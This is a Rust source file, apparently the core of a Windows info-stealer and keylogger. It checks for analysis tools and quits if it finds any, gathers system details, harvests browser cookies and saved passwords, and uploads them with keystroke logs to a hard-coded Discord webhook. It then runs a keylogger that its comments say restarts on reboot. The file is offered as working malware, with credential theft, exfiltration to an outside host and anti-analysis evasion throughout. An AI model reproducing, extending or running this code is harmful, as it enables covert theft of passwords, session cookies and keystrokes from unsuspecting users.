#![windows_subsystem = "windows"]

use anyhow::Result; 
use keylogger::keylog_all;
use serenity::{http::Http, model::{channel::{Embed,AttachmentType},webhook::Webhook}};
use sysinfo::{System, SystemExt};
use std::{process, env, fs, path::PathBuf};
mod cookies;
mod anti_analysis;
mod keylogger;
mod utils;

use crate::utils::unwrap_string;


// Async main function, needs [tokio] crate to work, [futures] isn't enough.
#[tokio::main]
async fn main(){

    // Kill process if anti-analysis are present.
    if anti_analysis::detected(){
        println!("Seppuku!");
        process::exit(0);
    }

    // Get system info and store them in a String.
    let sys = System::new_all();
    let mut sysinfo = String::new();
    sysinfo.push_str(&format!("Username:                {}\n", env::var_os("USERNAME").unwrap().into_string().unwrap()));
    sysinfo.push_str(&format!("System name:             {}\n", unwrap_string(sys.name())));
    sysinfo.push_str(&format!("System OS version:       {}\n", unwrap_string(sys.os_version())));
    sysinfo.push_str(&format!("System host name:        {}\n", unwrap_string(sys.host_name())));

    // Create cookies files and write the cookies we get with [cookies.rs] in it.
    let cookies_file = env::temp_dir().join("cookies.txt");
    let cookies_strings = cookies::get_cookies().unwrap();
    fs::write(&cookies_file, cookies_strings.join("\n")).unwrap();

    // Create cookies files and write the passwords we get with [cookies.rs] in it.
    let passwords_file = env::temp_dir().join("passwords.txt");
    let passwords_strings = cookies::get_passwords().unwrap();
    fs::write(&passwords_file, passwords_strings.join("\n")).unwrap();

    // Create logs file Path
    let mut logs = PathBuf::new();
    logs.push("logs.txt");

    // Send system info, cookies, passwords and logs (if present, they aren't after first run) to Discord server.
    send(sysinfo, cookies_file, passwords_file, logs).await;

    // Start keylogging to [logs.txt], ends at shutdown and restarts at reboot (thanks to the injector)
    keylog_all();
}

// Send elements to Discord servers with Discord Webhooks.
async fn send(data: String, file: PathBuf, file2: PathBuf, file3: PathBuf) -> Result<()>{
    let http = Http::new("token");
    let url = "https://discord.com/api/webhooks/1105833038648189028/bxqCh8d4ptvleFfvZyRz80Wtf161_-KDBoGbPXeYEo-4UJOI5cUEbQS156GSX419JM6u";
    
    // Create webhook.
    let webhook = Webhook::from_url(&http, url).await?;

    // Embed [data] in a discord message.
    let embed = Embed::fake(|e| {
    e.title("System info");
    e.description(
        data,
    );
    e
});

    // Execute Webhook, add metadata, content and files.
    webhook
        .execute(&http, true, |w| {
            w.content("content")
                .username("username")
                .embeds(vec![embed])
                .add_file(AttachmentType::Path(&file))
                .add_file(AttachmentType::Path(&file2));
                // Add [logs.txt] only if it exists (which isn't the case at the first run).
                if file3.exists() { w.add_file(AttachmentType::Path(&file3)); }
                w
        })
        .await?;
    Ok(())
}
